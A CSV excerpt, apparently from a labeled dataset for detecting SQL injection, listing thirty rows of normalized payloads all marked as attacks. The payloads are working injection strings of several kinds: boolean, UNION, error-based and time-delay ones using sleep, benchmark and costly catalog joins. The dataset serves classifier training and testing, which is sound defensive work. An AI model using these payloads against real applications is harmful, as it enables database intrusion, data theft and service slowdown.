row_index,payload_norm,label,sqli_type_hint
1140,"1"" ) ) as bbkl where 5686 = 5686",1,
1141,"1%"" ) and ( 3020 = 3020 ) *6703 and ( ""%"" = """,1,
1142,1'+ ( select 'cwta' where 6091 = 6091,1,
1143,"1%"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""%"" = """,1,
1144,"-6333"" ) ) ) union all select 9851,9851,9851,9851,9851,9851--",1,
1145,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""xccy"" = ""xccy",1,
1146,"1"" ) as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
1147,"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
1148,"-1808%"" ) ) or 4595 = 3545 and ( ( ""%"" = """,1,
1149,1 ) as bhdj where 4472 = 4472,1,
1150,"1%"" union all select null,null,null,null,null#",1,
1151,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1,
1152,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1,
1153,1' ) ) as pgif where 6346 = 6346,1,
1154,"1"" ) as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
1155,"1"" ) ) as mvxa where 3024 = 3024",1,
1156,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""cneo",1,
1157,"1%"" ) rlike sleep ( 5 ) and ( ""%"" = """,1,
1158,"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
1159,"1' ) as knxr where 5662 = 5662 union all select null,null,null,null,null,null,null,null#",1,
1160,-6045 or 8919 = 2827--,1,
1161,"1%"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,1,
1162,"1"" ) ) as khqq where 3637 = 3637 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1163,"1' ) as xvcr where 6456 = 6456 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
1164,"-3349 ) ) ) union all select 6553,6553#",1,
1165,"-3475"" or elt ( 5532 = 4242,4242 )",1,
1166,select ( case when ( 2774 = 5503 ) then 2774 else 2774* ( select 2774 from information_schema.character_sets ) end ) #,1,
1167,"1' ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
1168,"1 ) ) as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
1169,-7505' ) ) as lqvw where 8565 = 8565 or 6872 = 6872--,1,
